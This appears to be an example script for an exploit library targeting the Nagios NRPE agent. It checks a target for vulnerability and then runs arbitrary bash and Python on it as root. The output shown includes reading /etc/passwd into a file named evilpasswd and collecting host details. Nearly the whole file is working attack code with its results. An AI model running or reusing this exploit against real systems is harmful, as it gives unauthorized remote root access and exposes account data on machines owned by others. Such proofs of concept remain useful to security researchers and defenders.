#!/usr/bin/env python3

import sys
from nrpexploit import NRPExploit

targetIP = "10.0.1.5"

N = NRPExploit(targetIP)

# Is the target vulnerable ?
vulnerable = N.check_target()

if not vulnerable :
    print("Target is NOT vulnerable")
    sys.exit()


print("Target is vulnerable")

# #1 - BASH : Single command execution
print('#1')
output = N.exec_remote_bash_script("whoami")
print(output)
"""root"""

# #2 - BASH : Entire script execution
print('#2')
output = N.exec_remote_bash_script("""
uname -a
whoami
ip a | grep inet
hostnamectl
echo "Minion1 Slave2 Master3" | awk '{print $2}'
touch /tmp/nrpexploit.test
echo $?
cat /etc/passwd > /tmp/evilpasswd
tail -n 3 /tmp/evilpasswd
rm -f /tmp/evilpasswd
""")
print(output)
"""Linux localhost 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
root
    inet 127.0.0.1/8 scope host lo
    inet 10.0.1.5/24 brd 10.0.1.255 scope global eth0
   Static hostname: n/a
Transient hostname: localhost
         Icon name: computer-vm
           Chassis: vm
           Boot ID: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
    Virtualization: kvm
  Operating System: Ubuntu 14.04.2 LTS
            Kernel: Linux 4.4.0-116-generic
      Architecture: x86_64
Slave2
0
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
ntp:x:106:111::/home/ntp:/bin/false
nagios:x:1001:1001::/home/nagios:/bin/false"""

# #3 - PYTHON : Entire script execution
print('#3')
output = N.exec_remote_python_script("""
import random
import string
print(''.join(random.choice(string.ascii_letters) for i in range(10)))
""")
print(output)
"""UYwhWKIHBG"""
